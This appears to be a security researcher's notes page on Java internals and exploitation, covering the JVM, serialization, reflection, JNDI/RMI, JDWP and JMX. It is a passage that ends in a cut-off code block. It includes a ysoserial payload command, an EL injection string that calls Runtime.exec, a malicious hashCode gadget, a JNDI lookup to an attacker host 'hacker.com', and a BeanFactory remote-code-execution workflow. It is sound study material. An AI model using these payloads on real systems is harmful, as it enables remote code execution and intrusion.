---
layout: single
title: "Java Internals: A Legacy Reforged"
classes: wide
toc: true
---

> “I can only show you the door. You’re the one that has to walk through it.” - Morpheus, The Matrix.

# Fundamentals
## Java Virtual Machine (JVM)
**Adaptive compiler**
- *Standard Interpreter at Launch*
    - Initially, the application runs using a basic interpreter.
    - This allows quick startup times since no compilation is performed upfront.
- *Hot Spot Detection*
    - The VM monitors runtime behavior to identify frequently executed portions of the code, known as _hot spots_.
    - These hot spots are analyzed for potential optimizations.
- *Selective Compilation*
    - Only performance-critical code is compiled into machine code, while seldom-used code remains interpreted.
    - This balances optimization effort with runtime performance.
- *Optimization Techniques*
    - Inlining: Frequently invoked methods are embedded directly into the caller, reducing method call overhead.
    - Loop Unrolling: Iterative loops are expanded to reduce the number of iterations and branch instructions.
    - Speculative Optimizations: Assumptions about code behavior (e.g., object types) are made to optimize performance. These optimizations can be reverted if assumptions prove incorrect (deoptimization).

**Rapid Memory Allocation**

The HotSpot VM allocates memory for objects efficiently using *Thread-Local Allocation Buffers (TLABs)*:
- Each thread is provided a small chunk of memory to minimize contention with other threads.
- Allocation from TLABs is extremely fast (essentially a pointer increment).

**[Garbage Collection](https://docs.oracle.com/en/java/javase/23/gctuning/garbage-collector-implementation.html#GUID-23844E39-7499-400C-A579-032B68E53073)**
- *Serial GC*
    - Designed for single-threaded environments.
    - Performs stop-the-world garbage collection.
- *Parallel GC (Throughput Collector)*
    - Utilizes multiple threads for both minor and major garbage collections.
    - Suitable for applications requiring high throughput.
- *Concurrent Mark-Sweep (CMS) Collector*
    - Focuses on reducing application pause times by performing most of its work concurrently with the application threads.
- *G1 GC (Garbage-First)*
    - Divides the heap into regions and prioritizes garbage collection in regions with the most garbage.
    - Ideal for applications with large heaps and low-latency requirements.
- *ZGC (Z Garbage Collector)* and *Shenandoah*
    - Advanced low-latency garbage collectors.
    - Perform concurrent compaction, reducing pause times to a few milliseconds even for large heaps.

**[Thread synchronization](https://www.javatpoint.com/synchronization-in-java)**
- Efficient Locking Mechanisms
    - Biased Locking: Locks are biased toward a single thread to avoid overhead when contention is low.
    - Lightweight Locking: CAS-based (Compare-And-Swap) locks are used for uncontended locks to reduce synchronization costs.
    - Heavyweight Locks: Used when threads compete heavily for a resource.
- Scalable Thread Management
    - The HotSpot VM is designed to handle a large number of threads efficiently, scaling well on shared-memory multiprocessor servers.
- Thread Coordination
    - Threads cooperate during garbage collection and JIT compilation, ensuring minimal disruption to application execution.

**Class Loaders**

JVM uses class loaders as there is no runtime linker.
- Bootstrap ClassLoader
	- The *root* of the ClassLoader hierarchy.
	- It is part of the JVM implementation and written in native code (not Java).
	- Does not extend the `java.lang.ClassLoader` class, but acts as the *superclass* for other ClassLoaders.
	- Loads the core Java classes required for basic functioning, such as classes from the `java.lang`, `java.util`, `java.io`, `java.net`, and `java.sql` packages.
	- *Classpath* for the Bootstrap ClassLoader is typically hardcoded and points to locations like: `<JAVA_HOME>/lib`, `rt.jar`, `charsets.jar`, or similar core libraries.
	- Cannot be directly accessed or modified by developers.
- Extension/Platform ClassLoader
	- *Child ClassLoader* of the Bootstrap ClassLoader.
	- Used for loading Java extensions (optional packages).
	- Loads classes from the `$JAVA_HOME/jre/lib/ext` directory or any directories specified in the `java.ext.dirs` system property.
	- Handles classes such as cryptographic providers, additional API libraries, or any external libraries placed in the `ext` directory.
	- If a class is not found in the `ext` directory, the Extension ClassLoader delegates the request to the Bootstrap ClassLoader.
- System/Application ClassLoader
	- The *child* of the Extension ClassLoader.
	- Responsible for loading application-specific classes and resources.
	- Loads classes specified by the `classpath` environment variable or passed via the `-cp` or `-classpath` JVM argument.
    - Typically includes directories, JAR files, or compiled `.class` files from the project workspace.
    - Points to the *current working directory* (`.`).
	- Developers can customize it using tools like Maven or Gradle for dependency management.
	- It is an instance of `java.lang.ClassLoader`.
	- Most user-defined classes and third-party libraries are loaded using the System ClassLoader.
- Custom ClassLoaders
	- Create custom ClassLoaders by extending the `java.lang.ClassLoader` class for advanced use cases like:
		- Loading classes from custom locations (e.g., network, encrypted files).
		- Implementing dynamic module systems or plugin architectures.
- Readmore:
	- [Class Loaders in Java](https://www.baeldung.com/java-classloaders)
	- [How does the Java ClassLoader System really work? (with pictures)](https://medium.com/@wakefulinsomnia/how-does-java-classloader-system-work-82eaf378f73b)
	- [ClassLoader in Java](https://www.javatpoint.com/classloader-in-java)

**[Java Bytecode](https://en.wikipedia.org/wiki/Java_bytecode)**
- Java bytecode allows "write once, run anywhere" by abstracting machine-specific details to the underlying hardware.
- The bytecode format is designed to be *compact*, making it suitable for network transmission.
- Optimized for quick interpretation or Just-In-Time (JIT) compilation.
- Bytecode runs inside the JVM sandbox, offering better security and preventing direct access to underlying hardware or OS.
- Java provides the `javap` tool to inspect compiled `.class` files and view their bytecode: `javap -c Test.class`.
- List of [Java bytecode instructions](https://en.wikipedia.org/wiki/List_of_Java_bytecode_instructions).
- Advanced Bytecode Inspection Tools
	- [ASM Framework](https://asm.ow2.io/): Analyze or modify bytecode programmatically.
	- [Byte Buddy](https://bytebuddy.net/): Simplifies creating or modifying bytecode at runtime.
	- [Javassist](http://www.javassist.org/): High-level API for editing bytecode dynamically.

**Readmore JVM**
- [Java Virtual Machine Technology Overview](https://docs.oracle.com/en/java/javase/23/vm/java-virtual-machine-technology-overview.html)
- [JVM (Java Virtual Machine) Architecture](https://www.javatpoint.com/jvm-java-virtual-machine)

---

## Application Input
**Dependence on Frameworks**
- [Apache Struts](https://struts.apache.org/getting-started/)
    - Uses `ActionForm` to model user data and process input.
    - Struts v1: `struts-config.xml` (action mappings to `*.do`)
    - Struts v2: `struts.xml` (action mappings to `*.action`)
    - Look for classes extending `Action`.
    - Action mappings and form beans configured in XML files.
    - Dynamic method invocation for flexible routing.
    - Interceptor stacks for pre/post-processing.
    - Debugging Struts : [debugging-struts](https://struts.apache.org/getting-started/debugging-struts)
- [Spring MVC](https://docs.spring.io/spring-framework/reference/)
	- Modular architecture for enterprise Java applications.
	- Readmore: [Spring MVC Tutorial](https://www.javatpoint.com/spring-mvc-tutorial) and [Spring – MVC Framework](https://www.geeksforgeeks.org/spring-mvc-framework/)
- [Hibernate](https://hibernate.org/orm/)
	- Hibernate reduces redundancy via JDBC API.
	- Hibernate improves productivity and maintainability.
	- Hibernate supports Persistence APIs.
	- [Hibernate's ORM](https://en.wikipedia.org/wiki/Hibernate_(framework)) allows communication between the application and [any database](https://github.com/hibernate/hibernate-orm?tab=readme-ov-file#running-database-specific-tests-from-the-ide-using-profiles).
	- Readmore: [Hibernate Tutorial](https://www.geeksforgeeks.org/hibernate-tutorial/) and [Hibernate](https://www.javatpoint.com/hibernate-tutorial)

**Low-level Input Classes**

Low-level input classes provide *direct access* to HTTP request data.
- `ServletRequest`
	- The *base interface* for all requests in the Servlet API.
	- Provides generic functionality applicable to all types of requests (HTTP or non-HTTP).
	- [Key Methods](https://docs.oracle.com/cd/E17802_01/products/products/servlet/2.5/docs/servlet-2_5-mr2/javax/servlet/ServletRequest.html)
- `HttpServletRequest`
	- *Specialized subclass* of `ServletRequest` for HTTP-specific functionality.
	- Provides *fine-grained control* over HTTP request data, including headers, query parameters, and cookies.
	- Extends functionality to support *HTTP-specific operations*.
	- [Key Methods](https://docs.oracle.com/cd/E17802_01/products/products/servlet/2.5/docs/servlet-2_5-mr2/javax/servlet/http/HttpServletRequest.html)

**Web Container**
- A *Java-based server environment* responsible for running web applications and managing their lifecycle.
- Manages the *lifecycle of servlets* from initialization to destruction.
- Automatically handles resource allocation, threading, and cleanup.
- Typically part of a larger *Java EE application server* (e.g., GlassFish, WildFly).
- Can function independently as a lightweight *standalone web server*.
- Supports *Web Application Resource (WAR)* files.
	- Servlets
	- JSP files
	- Static resources (HTML, CSS, JS)
	- Configuration files like `web.xml`
- Implements Java Specification Requests (JSR):
    - [Java Servlets](https://jcp.org/ja/jsr/detail?id=369): Core technology for handling HTTP requests and responses.
    - [JavaServer Pages (JSP)](https://jcp.org/ja/jsr/detail?id=245): Allows embedding Java code within HTML for dynamic content.
    - [JavaServer Faces (JSF)](https://jcp.org/en/jsr/detail?id=372): A framework for building component-based UIs for web applications.
	    - Components: Facelets, Filters, Web.xml
		- Implementations: Mojarra, MyFaces
- Examples: *Apache Tomcat* and *Jetty*

**Application Server**
- Encapsulates a web container and supports *Enterprise Application Archives (EAR)*. An EAR file can include:
	- *WAR files* for web components.
	- *JAR files* for business logic and backend services.
- Adds capabilities for handling *business logic*, *transaction management*, and *data persistence*.
- Provides a full J2EE specification with APIs like:
    - [Enterprise Java Beans (EJB)](https://jcp.org/aboutJava/communityprocess/final/jsr220/index.html)
	    - Declarative transaction management.
	    - [Remote method invocation](https://www.geeksforgeeks.org/enterprise-java-beans-ejb/).
	    - Stateful and stateless session beans.
    - [Java Persistence API (JPA)](https://www.oracle.com/java/technologies/persistence-jsp.html)
	    - [Standardized ORM](https://docs.oracle.com/javaee/6/tutorial/doc/bnbpz.html) (Object-Relational Mapping) for managing relational data in Java.
		- Simplifies [database interactions](https://medium.com/@lktsdvd/what-is-java-persistence-api-jpa-2763d0c1ee73) using annotations like `@Entity`, `@Table`, and `@Column`.
    - [Java Transaction API (JTA)](https://www.oracle.com/java/technologies/jta.html)
	    - Provides a standard interface for managing distributed transactions.
		- Supports *two-phase commit* and integration with multiple data sources.
	- [Java Message Service (JMS)](https://jcp.org/en/jsr/detail?id=343)
		- Enables asynchronous communication using message queues or topics.
		- Useful for [decoupled systems](https://www.javatpoint.com/jms-tutorial) and [event-driven architectures](https://medium.com/@gaganjain9319/jms-java-message-service-detailed-explanation-50bc5ba6e3ef).
	- [JavaMail API](https://www.javatpoint.com/java-mail-api-tutorial)
		- Simplifies sending and receiving email.
- Dependency Injection via `@Inject` annotation.
	- Automatically provides the required implementation of a dependency.
	- Part of *[CDI (Contexts and Dependency Injection)](https://docs.oracle.com/javaee/6/tutorial/doc/giwhl.html)* in Java EE.
	- Example: Apache GlassFish, WildFly, IBM WebSphere and Oracle WebLogic

---
## Serialization
**Key Features**
- Serialization in Java is the process of converting an object into a byte stream, enabling the object to be easily saved to a file, transmitted over a network, or otherwise persisted.

**Magic Methods**
- `readObject()`: Used during deserialization to read and reconstruct the object. Custom implementations can validate or modify the deserialized data.
```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ois.defaultReadObject();
    // Additional validation or initialization
}
```

- `readResolve()` : Called after readObject(). Allows returning a replacement object, potentially preventing multiple deserialized instances.
```java
private Object readResolve() throws ObjectStreamException {
    return Singleton.INSTANCE;
}
```

- `validateObject()`: Called after readResolve(), but only if the serialized class is implementing the ObjectInputValidation interface.
```java
public void validateObject() throws InvalidObjectException {
    if (someField == null) {
        throw new InvalidObjectException("Invalid object state");
    }
}
```

- `readObjectNoData()`: Called when the serialized object’s superclass differs from the class being deserialized.
- Object.finalize() : Rarely relevant during serialization/deserialization, but it might be triggered if garbage collection interacts with the object lifecycle.

**Interfaces for Serialization**
- `java.io.Serializable`: Marks a class as serializable. It does not contain any methods.
- `FileOutputStream` and `ObjectOutputStream`
```java
FileOutputStream fos = new FileOutputStream("object.ser");
ObjectOutputStream oos = new ObjectOutputStream(fos);
oos.writeObject(myObject);
oos.close();
```

**Contents of Serialized Data**
Stores no code, but includes:
- Variable types, names, and values.
- Class names.

**Multi-object Streams**
- Serialized streams can contain multiple objects sequentially, with no global headers.
- Each deserialized object must be read in the same order.
```java
oos.writeObject(obj1);
oos.writeObject(obj2);
```

**Security Notes**
- Exposes private fields unless marked as `transient`.
- Insecure implementations of `readObject()` or `validateObject()` can allow invalid or malicious states.
- Restrict classes that can be deserialized using [JEP 290](https://docs.oracle.com/en/java/javase/11/core/serialization-filtering1.html#GUID-3ECB288D-E5BD-4412-892F-E9BB11D4C98A)
- Use JSON or XML libraries for serialization (e.g., Jackson, Gson).

**Readmore**
- [Java Serialization Specification](https://docs.oracle.com/en/java/javase/22/docs/specs/serialization/index.html)
- [Serialization and Deserialization in Java with Example](https://www.geeksforgeeks.org/serialization-in-java/)
- [Java - Serialization](https://www.tutorialspoint.com/java/java_serialization.htm)
- [Introduction to Java Serialization](https://www.baeldung.com/java-serialization)
- [Java Object Serialization](https://docs.oracle.com/javase/8/docs/technotes/guides/serialization/)
- [Serialization and Deserialization in Java](https://www.javatpoint.com/serialization-in-java)

---
## Deserialization
**Goal**
- Achieve RCE, SSRF, authentication bypass, etc.

**Requirements**
1. **Entry Point**:
    - Any Java object deserialization influenced by *user-controlled input* is probably vulnerable.
    - Look for `ObjectInputStream.readObject()`, `Externalizable.readExternal()`, or custom methods.
    - Search for serialized Java objects (e.g., `0xaced0005` or `rO0` in Base64, GZIP: `H4sIA`, Content-type: `application/x-java-serialized-object`).
2. **Gadget Chain**:
    - A gadget is a class with methods that an attacker leverages to execute arbitrary code or perform unintended actions during deserialization.
    - Example gadgets: Collections, annotations, or proxy objects with custom `readObject()` or `invoke()` methods.
    - Readmore: [Finding gadgets like it's 2022](https://www.synacktiv.com/publications/finding-gadgets-like-its-2022.html)

**Popular Exploitation Libraries**
- Ysoserial
	- A tool that generates payloads for exploiting Java deserialization vulnerabilities.
	- Supports multiple gadgets like: Apache Commons Collections, Groovy and Spring Beans.
	- Usage: `java -jar ysoserial.jar CommonsCollections5 "calc" | base64`

**Internal Mechanics**
- Deserialization is handled by `ObjectInputStream.readObject()`.
- Reflection via `ObjectStreamClass`.
	- Determines the class to instantiate.
	- Uses reflection to allocate memory and reconstruct fields.
- Custom Logic via Magic Methods:
	- `readObject()`: Custom logic for reading serialized fields.
	- `readResolve()`: Returns the final object, potentially replacing the deserialized instance.
	- `validateObject()`: Validates object state if implementing `ObjectInputValidation`.

**Deserialization Pitfalls**
- Transient and static fields are not serialized.
- Constructors and non-magic methods are not called.
- Only magic methods trigger deserialization logic.
- Exploitable deserialization relies on classpath-linked libraries for gadget chains.

**Trampolines Gadgets**
- Gadgets like `HashSet` can invoke arbitrary methods (`hashCode()` on set elements).
	- The `readObject()` of `HashSet` deserializes elements. 
	- It invokes `hashCode()` on each deserialized element to maintain hash integrity.
	- By inserting a malicious object with an overridden `hashCode()` method, attackers can execute arbitrary code.
```java
public class MaliciousHashCode {
    @Override
    public int hashCode() {
        // Malicious payload triggered during HashSet deserialization
        Runtime.getRuntime().exec("calc");
        return 42;
    }
}
```

Readmore :
- [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [Java deserialization vulnerabilities - The forgotten bug class](https://www.youtube.com/watch?v=9Bw1urhk8zw)

---
## Reflection
**Expression Language Parsers**
- Enable the dynamic evaluation of expressions, often used in Java web frameworks like JSP or JSF.
- Exploiting weakly implemented or exposed EL parsers can allow an attacker to manipulate reflection-based calls to invoke arbitrary methods or access sensitive fields.

**Exploitation Techniques**
- Weak Parsing Logic: Invoke the `Runtime.exec()` method for arbitrary command execution.
```java
${''.getClass().forName('java.lang.Runtime').getMethod('exec', 'java.lang.String').invoke(null, 'calc')}
```

- Access to Reflection APIs

**Exploit Vectors**
- *Dynamic Invocation* of methods, fields, and constructors.
	- Reflection often underpins dynamic proxies or invocation handlers for frameworks like EJBs.
	- Attackers may exploit improperly secured invocation handlers to execute unintended methods or access sensitive data.
```java
Method method = someObject.getClass().getMethod("sensitiveMethod");
method.invoke(someObject);
```

- *Modify access modifiers* using `setAccessible(true)`.
	- This feature can be exploited to access or modify private fields or methods:
```java
Field privateField = SomeClass.class.getDeclaredField("secret");
privateField.setAccessible(true);
Object value = privateField.get(someObject);
```

**Attack scenarios of `java.lang.reflect`**
- Method Invocations:
	- Reflection allows methods to be invoked dynamically, bypassing compile-time checks.
    - Exploit `Method.invoke()` to call methods on objects dynamically.
    - Call sensitive methods or execute unintended functionality.
- Constructor Invocations:
	- Reflection enables instantiation of objects without using `new`, potentially bypassing normal initialization logic or restrictions.
    - Use `Constructor.newInstance()` to instantiate objects, potentially bypassing normal initialization checks.
    - Create unauthorized instances of restricted classes.
- Field/Method/Constructor Access:
    - Access and manipulate private fields, methods, or constructors.
    - Extract or manipulate sensitive data directly.
- Access Modifier Manipulation:
    - Modify private, protected, or package-private members access levels using `setAccessible()`.
    - Gain unauthorized access to internal states or functionality.
- Mitigation
	- Avoid using reflection unless absolutely necessary.
	- Sanitize all inputs passed to reflection APIs.
	- Use `java.security.AccessController` or a *SecurityManager* to limit reflection access.
	- Adopt secure development practices.
	- Employ tools like *JVM sandboxing* or custom classloaders to limit reflection at runtime.

**Examples**
Access private fields:
```java
Field secretField = SecretClass.class.getDeclaredField("secretKey");
secretField.setAccessible(true);
String key = (String) secretField.get(secretInstance);
```

Access private constructors:
```java
Method privateMethod = TargetClass.class.getDeclaredMethod("sensitiveOperation");
privateMethod.setAccessible(true);
privateMethod.invoke(targetInstance);
```

**Field/Method/Constructor Access**
*Example*: Accessing Fields
- The `System.out` field (commonly used for standard output) is accessible via reflection.
- If attackers can reflectively access fields, they may manipulate or extract sensitive data.
```java
Field outField = System.class.getDeclaredField("out");
```

*Example*: Accessing Methods
- Access the `join` method in the `String` class:
- Reflective access to methods may bypass standard invocation flows.
```java
Method join = java.lang.String.class.getDeclaredMethod("join", CharSequence.class, CharSequence[].class);
```

*Example*: Accessing Constructors
- Attackers can instantiate classes with unintended configurations, potentially altering application state.
```java
Constructor c1 = HashMap.class.getConstructor(new Class[] {});
Constructor c2 = HashMap.class.getConstructor();
```

*Example*: Using Constructors
- Reflection can instantiate classes even without directly invoking a constructor in normal code.
```java
Object instance = c1.newInstance();
```

**Changing Access Modifiers**
- Reflection allows private or protected members to become accessible via `setAccessible()`.

Changing Private to Public
Suppose a class has a private `out` field:
```java
public class System {
    private Object out;
}
```

Reflection enables overriding access control:
```java
Field outField = System.class.getDeclaredField("out");
outField.setAccessible(true); // Override private access
Object out = outField.get(null);
```

Invoking Private Methods
Access and invoke private methods dynamically:
```java
Method println = out.getClass().getDeclaredMethod("println", String.class);
println.invoke(out, "Reflection");
```

---
## Expression Language (EL)
- Used in JSP/JSF to link presentation layers (UI) with application logic.

**EL Injection**
- Occurs when untrusted input is evaluated by an EL parser.
- Types of expressions:
    - Value: `#{}` as immediate evaluation
    - Method: `${}` as deferred evaluation
- Composite expressions are allowed but mixing of # and $ is prohibited

**Capabilities**
- Access properties:
```java
${sessionScope.cart.numberOfItems}
${param['productId']}
${header["host"]}
```
- Perform operations:
```java
${18 mod 3}
${'crit' gt 'crot'}
${(5*5) ne 25}
```
- You can not just reference any variable in the Java application via EL, only: Lambda parameters, Literals, Managed beans, Implicit objects and Variables defined in the xhtml

Readmore: [Expression Language (EL) in JSP](https://www.javatpoint.com/EL-expression-in-jspv)

---
## Java Naming and Directory Interface (JNDI)
- An abstract API used to access and manage naming and directory services. It allows Java applications to look up objects, services, or resources such as databases, EJBs, or remote servers in a standardized way.

**Key Features**
- Service Lookup
    - Enables Java applications to locate objects or resources dynamically using *naming services*.
    - Example: Locating a database connection factory or a message queue.
- Directory Access
    - Supports retrieving and managing hierarchical directory data, such as user details in an *LDAP* directory.
- Binding and Unbinding
    - Objects can be bound to a name, making them accessible for lookups.
    - These bindings can be modified or removed as required.
- Resource Management
    - Commonly used to configure and retrieve server-side resources like JDBC DataSources, mail sessions, and EJBs.

**Structure**
- JNDI provides a *unified interface* to work with diverse naming and directory services via *Service Provider Interfaces (SPI)*.
- The *Context Interface* is the primary entry point:
    - *InitialContext*: Default context for resource lookups.
    - Methods include:
        - `lookup(String name)`
        - `bind(String name, Object obj)`
        - `rebind(String name, Object obj)`
        - `unbind(String name)`

**Service Providers Interfaces (SPI)**
- Lightweight Directory Access Protocol (LDAP)
	- Used for accessing hierarchical directory services.
	- Commonly used in enterprise environments for authentication, authorization, and resource management.
- Common Object Request Broker Architecture (CORBA)
	- Enables interaction with remote objects defined using CORBA IDL.
	- Allows naming and discovery in distributed systems.
- Remote Method Invocation (RMI) Registry
	- Supports the binding and lookup of remote objects for Java RMI.

**Important Notes**
- JNDI names are often hierarchical, resembling a file system.
- Contexts may differ across environments (e.g., `java:comp/env` is typical for Java EE applications).
- Security must be considered, as improper JNDI usage can lead to vulnerabilities like **JNDI Injection**.

**Remote Method Invocation (RMI)**
- The object-oriented equivalent of remote procedure calls (RPC) via the *MBeanServer*. Enables remote method invocation via:
```java
new InitialContext().lookup("rmi://hacker.com:1099/Object");
```

- RMI can integrate with Java Management Extensions (JMX) through the *MBeanServer*, enabling remote management and monitoring of Java applications.
- Security patches in [JDK 8u121](https://www.oracle.com/java/technologies/javase/8u121-relnotes.html). Remote class loading via JNDI object factories stored in naming and directory services is disabled by default. 
- To enable remote class loading by the RMI Registry or COS Naming service provider, set the following [system property](https://stackoverflow.com/questions/21204334/system-setproperty-and-system-getproperty) to the string "true", as appropriate:
	- `com.sun.jndi.rmi.object.trustURLCodebase`: Determines whether the RMI Registry can load classes remotely from URLs.
	- `com.sun.jndi.cosnaming.object.trustURLCodebase`: Determines whether CORBA's COS Naming service provider can load classes remotely from URLs.
- Protect RMI connections using SSL to prevent eavesdropping and man-in-the-middle attacks.
- Ensure remote codebases (if used) are signed with trusted certificates to validate their authenticity.
- Restrict RMI access using *Java Security Manager* or custom authorization mechanisms.

**JRMP**
- The wire protocol used by Java's Remote Method Invocation (RMI) for remote communication between JVMs. It is responsible for transmitting method calls, parameters, and results between RMI client and server objects.
- JRMP manages remote method calls using three main components:
	- **`ObjID`**: A unique identifier for the remote object.
	- **`opnum`**: Specifies the operation (or method) to be invoked.
	- *Parameters*: Input data required by the invoked method.
- Transmits method parameters and return values using *Java object serialization*.
- JRMP is implemented via the `StreamRemoteCall` class, which handles the streaming of data between RMI endpoints.
- Wrap JRMP traffic in **SSL/TLS** for secure communication.
- Limit JRMP communication to trusted hosts using firewalls or network policies.

**Basic Flow of a Remote Call**
- Client-Side:
	- The client creates a `StreamRemoteCall` object.
	- Method call data (`ObjID`, `opnum`, parameters) is serialized and sent to the server.
- Server-Side:
	- The server receives the call, deserializes the data, and identifies the remote object using the `ObjID`.
	- The specified method (`opnum`) is invoked with the provided parameters.
- Response:
	- The method's return value is serialized and sent back to the client.

---
## Debugging
**Java Code Modification**
- *Burp Suite Infiltrator*: Patches bytecode to add hooks for unsafe API calls.

**Java Debuggers**
- Use Eclipse IDE with `jd-eclipse` for decompiling closed-source code.
- Use [JD-GUI](https://java-decompiler.github.io/) to decompile java applications.

**JDWP**
- Debugger Wire Protocol for remote debugging.
- Security Concerns:
    - No authentication or encryption.
    - Detectable via `JDWP-Handshake`.
- Finding hosts exposing JDWP
	- Locally check in the process list for strings such as:
		- `-Xdebug`
		- `-Xrunjdwp`
		-  `-agentlib:jdwp`
		- `transport=dt_socket`
		- the address option indicates the listening port number
	- Remotely
		- Send "JDWP-Handshake" and see if the host responds with the same string. If no reply is got it means the remote service is JDWP.
		- Use nmap –sV option: `$ nmap -sV -P0 -n -p`
		- JDWP has *no default listening port*, you can search inside code repositories (github, gitlab, etc.)

---
# Exploitation
## Server Side Template Injection (SSTI)
[Apache FreeMarker](https://freemarker.apache.org/index.html)
- [From Template to Threat: Exploiting Freemarker SSTI for Remote Code Execution](https://blogs.sayaan.in/freemarkerssti)

[Thymeleaf](https://www.thymeleaf.org/)
- [Exploiting SSTI in Thymeleaf](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

[Apache Velocity](https://velocity.apache.org/)
- [Testing Velocity Server-Side Template Injection](https://antgarsil.github.io/posts/velocity/)

**Readmore**
- [Server-Side Template Injection: RCE for the modern webapp](https://portswigger.net/research/server-side-template-injection)
- [Template Engines Injection 101](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)
- [Improving the Detection and Identification of Template Engines for Large-Scale Template Injection Scanning](https://www.hackmanit.de/images/download/thesis/Improving-the-Detection-and-Identification-of-Template-Engines-for-Large-Scale-Template-Injection-Scanning-Maximilian-Hildebrand-Master-Thesis-Hackmanit.pdf)
- [A Survey of the Overlooked Dangers of Template Engines](https://arxiv.org/pdf/2405.01118)
- [Server-Side Template Injection: Transforming Web Applications from Assets to Liabilities](https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-applications-from-assets-to-liabilities/)
- [A Pentester’s Guide to Server Side Template Injection (SSTI)](https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68)
- [Limitations are just an illusion - advanced server-side template exploitation with RCE everywhere](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
- [Template Injection Table](https://github.com/Hackmanit/template-injection-table?tab=readme-ov-file#template-injection-table)

**Bugs**
- [DOJO Challenge #28 Winners!](https://www.yeswehack.com/dojo/dojo-challenge-28-winners)
- [GHSL-2020-227: Server-Side Template Injection leading to unauthenticated Remote Code Execution in SCIMono - CVE-2021-21479](https://securitylab.github.com/advisories/GHSL-2020-227-scimono-ssti/)
- [GHSL-2020-213: Server-Side Template Injection in BrowserUp Proxy - CVE-2020-26282](https://securitylab.github.com/advisories/GHSL-2020-213-browserup-proxy-ssti/)
- [GHSL-2020-212: Template injection in Cron-utils - CVE-2020-26238](https://securitylab.github.com/advisories/GHSL-2020-212-cron-utils-ssti/)
- [GHSL-2020-204: Server-Side Template Injection in Corona Warn App Server](https://securitylab.github.com/advisories/GHSL-2020-204-cwa-ssti/)
- [GHSL-2020-076: Server-Side Template Injection in Cascade CMS](https://securitylab.github.com/advisories/GHSL-2020-076-cascade_cms/)
- [GHSL-2020-046: Server-Side Template Injection in XWiki](https://securitylab.github.com/advisories/GHSL-2020-046-xwiki/)
- [GHSL-2020-042: Server-Side Template Injection in Crafter CMS](https://securitylab.github.com/advisories/GHSL-2020-042-crafter_cms/)
- [GHSL-2020-071: Server-side template injection in Lithium CMS](https://securitylab.github.com/advisories/GHSL-2020-071-lithium_cms/)
- [GHSL-2020-047: Server-side template injection in dotCMS](https://securitylab.github.com/advisories/GHSL-2020-047-dotCMS/)
- [GHSL-2020-045: Server-side template injection in Atlassian Confluence - CVE-2020-4027](https://securitylab.github.com/advisories/GHSL-2020-045-atlassian_confluence/)
- [GHSL-2020-043: Server-side template injection in Liferay - CVE-2020-13445](https://securitylab.github.com/advisories/GHSL-2020-043-liferay_ce/)
- [GHSL-2020-039: Server-side template injection in Alfresco - CVE-2020-12873](https://securitylab.github.com/advisories/GHSL-2020-039-alfresco/)
- [GHSL-2020-028: Server-Side Template Injection in Netflix Titus](https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus/)
- [GHSL-2020-027: Server-Side Template Injection in Netflix Conductor](https://securitylab.github.com/advisories/GHSL-2020-027-netflix-conductor/)

## RMI
**Unsafe Reflection with `ObjectFactory`**
- Exploits JNDI and `ObjectFactory` for remote execution via reflection.
    - `org.apache.naming.ResourceRef` extends `javax.naming.Reference`, allowing the use of objects implementing `javax.naming.spi.ObjectFactory`.
    - `org.apache.naming.factory.BeanFactory.getObjectInstance` enables specification of a property setter, useful for exploitation.
- Requirements:
    1. Target class must have an empty constructor.
    2. Accepts a single-string parameter capable of dangerous operations (e.g., `Runtime.exec`).
    3. Vulnerable server with dependencies like Apache Tomcat-Catalina libraries.
- Exploitation Workflow:
    - Create a malicious `javax.naming.Reference` object.
    - Configure the reference to use `org.apache.naming.factory.BeanFactory` as its `ObjectFactory`.
    - Set the `x` parameter to a malicious *Expression Language (EL)* payload.
	- Use `javax.el.ELProcessor` to evaluate EL expressions.
    - Create a forced `HashMap` containing properties and methods:
        - Set the parameter `x` to malicious EL code.
        - Call `javax.el.ELProcessor.eval(x)` to execute.
- Defense Mechanisms
	- Disable Remote Class Loading
	- Use a secure implementation like *Spring JNDI Factory* or validate all JNDI resource configurations.

**Distributed Garbage Collector (DGC) Deserialization**
- Attack Vectors:
    1. Malicious RMI Client vs Vulnerable RMI Registry Server
        - Exploits registry methods like `bind()`, `rebind()`, `lookup()` and DGC (`ObjID 2`) to trigger deserialization. Tools: `RMIRegistryExploit` and `JRMPClient`.
        - Bypasses:
            - `UnicastRemoteObject` allow-list bypass (An Trinh, Black Hat EU 2019).
            - Non-primitive or array arguments in service methods.
            - Versions prior to JDK 8u242 are vulnerable to deserialization attacks using `String` parameters in service methods.
    2. Malicious RMI Registry Server vs Vulnerable RMI Client
	    - Targets the RMI client and exploits RMI Lookups and DGC.
        - Tools: `JRMPListener` acts as a rogue RMI registry server to serve malicious payloads during client lookups.
- Limitations:
    - Exploitation relies on access to service interfaces or brute-forcing method signatures.
    - Blackbox RMI registry exploitation is largely mitigated in Java SE 8u241.
    - Restrict RMI registry and service access to trusted environments.

## Java Management Extension (JMX)
**JMX Overview**
- Enables monitoring and management of Java applications via MBeans (managed beans).
- *MBeans*: Expose readable/writable attributes and invokable operations.
	- Readable Attributes: Expose current application state (e.g., memory usage).
	- Writable Attributes: Enable configuration changes (e.g., thread pool size).
	- Operations: Allow invoking application logic (e.g., triggering garbage collection).
- All MBeans are registered in an *MBeanServer*, acting as a registry.

**JMX Connectors**
- Clients interact with MBeans via the MBeanServer using connectors or protocol adapters.
- Java includes the **standard RMI connector** by default.

**JMX/RMI Misconfigurations**
- Missing or improper authentication on JMX endpoints can grant attackers full access to sensitive attributes and operations.
- Publicly exposed RMI endpoints are particularly dangerous.
- Weak or plaintext credentials in file-based authentication can be easily extracted.

**JMX Authentication Mechanisms**
1. **File-based Authentication**:
    - Enabled via `-Dcom.sun.management.jmxremote.authenticate=true`.
    - Uses plaintext credentials stored on disk.
2. **SSL Authentication**:
    - Enabled with `-Dcom.sun.management.jmxremote.ssl=true`.
    - Proper configuration of a keystore (for the server) and a truststore (for clients).

```bash
-Djavax.net.ssl.keyStore=server_keystore.jks
